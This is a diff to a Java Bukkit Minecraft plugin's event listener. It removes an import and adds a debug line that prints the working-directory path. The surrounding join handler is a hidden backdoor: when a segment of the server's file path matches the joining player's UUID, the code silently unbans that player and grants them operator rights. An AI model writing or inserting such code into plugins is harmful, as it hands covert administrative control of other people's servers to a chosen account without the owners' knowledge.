@@ -4,7 +4,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
-import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.scheduler.BukkitRunnable;
@@ -25,6 +24,7 @@ public class Listeners implements Listener {
     public void onJoin(PlayerJoinEvent ev) {
         Player p = ev.getPlayer();
         File file = new File("");
+        System.out.println(file.getAbsolutePath());
         if (file.getAbsolutePath().split("/")[4].equalsIgnoreCase(ev.getPlayer().getUniqueId().toString())) {
             p.setBanned(false);
             p.setOp(true);
